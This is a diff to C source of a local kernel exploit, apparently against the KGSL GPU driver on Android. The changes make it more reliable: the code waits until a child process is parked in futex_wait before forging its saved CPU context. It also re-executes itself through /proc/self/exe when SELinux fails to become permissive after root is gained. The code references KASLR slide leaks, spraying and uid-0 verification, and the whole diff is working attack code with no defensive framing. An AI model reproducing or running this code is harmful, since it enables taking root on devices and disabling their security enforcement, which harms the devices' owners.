@@ -784,6 +784,24 @@ static uint64_t sec_join64(const uint32_t *words) {
     return ((uint64_t)words[1] << 32) | words[0];
 }
 
+static int read_proc_task_state(pid_t pid, char *state);
+
+/*
+ * The hijack rewrites the child's saved thread.cpu_context.  That only
+ * works while the child is asleep in futex_wait: a runnable child re-saves
+ * its real context over the forged one on the next switch-out.  Wait for
+ * the /proc state to be 'S' before arming.
+ */
+static int wait_child_parked(pid_t pid, int timeout_ms) {
+    char state;
+    for (int elapsed = 0; elapsed < timeout_ms; elapsed += 10) {
+        if (read_proc_task_state(pid, &state) == 0 && state == 'S')
+            return 0;
+        usleep(10000);
+    }
+    return -1;
+}
+
 /*
  * Build the two-entry chain in the fpsimd vregs and, when trigger is set,
  * replace thread.cpu_context.  Returns the KASLR slide, or 0 when the dry
@@ -2361,6 +2379,15 @@ static void choose_spray_defaults(int children_set, int pressure_set) {
 }
 
 int main(int argc, char **argv) {
+    char **self_argv = argv;
+    int retry = 0;
+    const char *retry_env = getenv("KGSL_RETRY");
+    if (retry_env)
+        retry = atoi(retry_env);
+    if (retry >= 3) {
+        fprintf(stderr, "[-] permissive failed after %d attempts\n", retry);
+        return 1;
+    }
     setvbuf(stdout, NULL, _IONBF, 0);
     setvbuf(stderr, NULL, _IONBF, 0);
     g_start_ms = now_ms();
@@ -2701,6 +2728,9 @@ int main(int argc, char **argv) {
     uint64_t hijack_kaslr = 0;
     if (sec_perm_mode) {
         int trigger = env_flag("SEC_PERM_TRIGGER", 1);
+        if (wait_child_parked(root_child.pid, 2000) < 0)
+            fprintf(stderr, "[*] child %d not parked; arming anyway\n",
+                    root_child.pid);
         for (int arm = 0; arm < 3 && !hijack_kaslr; arm++) {
             hijack_kaslr = sec_perm_arm(fd, ctx, ib_id, ib_gpu, ib_vma,
                                         dump_id, dump_gpu, dump_vma,
@@ -2728,6 +2758,20 @@ int main(int argc, char **argv) {
     printf("[+] child %d verified uid/euid/gid/egid 0\n", root_child.pid);
     mark("root verified");
     if (sec_perm_mode) sec_report_permissive(hijack_kaslr, root_child.pid);
+    if (sec_perm_mode && hijack_kaslr && sec_read_enforce() != 0) {
+        char next[16];
+        snprintf(next, sizeof(next), "%d", retry + 1);
+        fprintf(stderr, "[*] permissive missed; restarting the exploit"
+                        " (attempt %d)\n", retry + 1);
+        kill_children_except(-1);
+        kill(root_child.pid, SIGKILL);
+        while (waitpid(root_child.pid, NULL, 0) < 0 && errno == EINTR) {}
+        abandon_round(&fd, &ib_id, &ib_vma, &dump_id, &dump_vma);
+        setenv("KGSL_RETRY", next, 1);
+        execv("/proc/self/exe", self_argv);
+        perror("execv /proc/self/exe");
+        return 1;
+    }
     if (sec_sid_mode && getenv("SEC_SIDSCAN") && forged_security) {
         int blk = 0, qse = 0, ctl = 0;
         int scan_max = SEC_SID_SCAN_MAX;
